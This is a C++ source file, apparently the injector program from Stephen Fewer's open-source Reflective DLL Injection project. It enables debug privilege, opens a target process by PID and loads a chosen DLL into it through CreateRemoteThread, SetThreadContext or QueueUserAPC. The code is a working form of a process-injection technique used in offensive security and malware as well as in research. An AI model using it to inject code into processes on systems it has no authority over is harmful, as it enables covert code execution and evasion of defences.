//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <atlbase.h>
#include "LoadLibraryR.h"

#pragma comment(lib,"Advapi32.lib")

using namespace ATL;

// Simple app to inject a reflective DLL into a process vis its process ID.
int main(int argc, char * argv[])
{
	DWORD processId       = ::GetCurrentProcessId();	
	const char* dllFile   = "reflective_dll.dll";
    InjectType injectType = kCreateRemoteThread;
    LoaderType loaderType = kReflectiveLoader;

    if (argc >= 2)
    {
        if (0 == lstrcmpi(argv[1], "help")
            || 0 == lstrcmpi(argv[1], "?") 
            || 0 == lstrcmpi(argv[1], "/?") 
            || 0 == lstrcmpi(argv[1], "-help") 
            || 0 == lstrcmpi(argv[1], "--help"))
        {
            printf(
                "Usage: inject [pid] [dll_file] [CRT|STC|QUA] [R|L]\n"
                "\t CRT - Create Remote Thread injection (default)\n"
                "\t STC - Set Thread Context injection\n"
                "\t QUA - Queue User APC injection\n"
                "\t R   - Reflective loader (default)\n"
                "\t LW  - LoadLibraryW loader\n"
                "\t LA  - LoadLibraryA loader\n"
                );
            return -1;
        }

        if (atoi(argv[1]) > 0)
        {
            processId = atoi(argv[1]);
        }
    }

    if (argc >= 3)
    {
        dllFile = argv[2];
    }

    if (argc >= 4)
    {
        if (0 == lstrcmpi(argv[3], "CRT"))
        {
            injectType = kCreateRemoteThread;
        }
        else if (0 == lstrcmpi(argv[3], "STC"))
        {
            injectType = kSetThreadContext;
        }
        else if (0 == lstrcmpi(argv[3], "QUA"))
        {
            injectType = kQueueUserAPC;
        }
    }

    if (argc >= 5)
    {
        if (0 == lstrcmpi(argv[4], "R"))
        {
            loaderType = kReflectiveLoader;
        }
        else if (0 == lstrcmpi(argv[4], "LW"))
        {
            loaderType = kLoadLibraryW;
        }
        else if (0 == lstrcmpi(argv[4], "LA"))
        {
            loaderType = kLoadLibraryA;
        }
    }

    printf("Inject type: %s\n", InjectTypeToString(injectType));
    printf("Loader type: %s\n", LoaderTypeToString(loaderType));

    HANDLE hToken = nullptr;
	if (::OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
        TOKEN_PRIVILEGES priv = {};
		priv.PrivilegeCount           = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
        if (::LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
        {
            ::AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
        }

		::CloseHandle(hToken);
        hToken = nullptr;
	}

	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess)
    {
        GOTO_CLEANUP_WITH_ERROR("Failed to open the target process");
    }

    switch (loaderType)
    {
    case kReflectiveLoader:
        if (!LoadRemoteLibraryR(hProcess, dllFile, injectType, nullptr))
        {
            GOTO_CLEANUP_WITH_ERROR("Failed to inject the DLL");
        }
        break;

    case kLoadLibraryW:
        if (!LoadRemoteLibrary(hProcess, CA2W(dllFile), injectType))
        {
            GOTO_CLEANUP_WITH_ERROR("Failed to inject the DLL");
        }
        break;

    case kLoadLibraryA:
        if (!LoadRemoteLibrary(hProcess, dllFile, injectType))
        {
            GOTO_CLEANUP_WITH_ERROR("Failed to inject the DLL");
        }
        break;

    default:
        break;
    }
        
	printf("[+] Injected the '%s' DLL into process %d.\n", dllFile, processId);
		
    if (processId == GetCurrentProcessId())
    {
        printf("Press any key to exit...\n");
        _getche();
    }

cleanup:
    if (hProcess)
    {
        ::CloseHandle(hProcess);
    }

	return 0;
}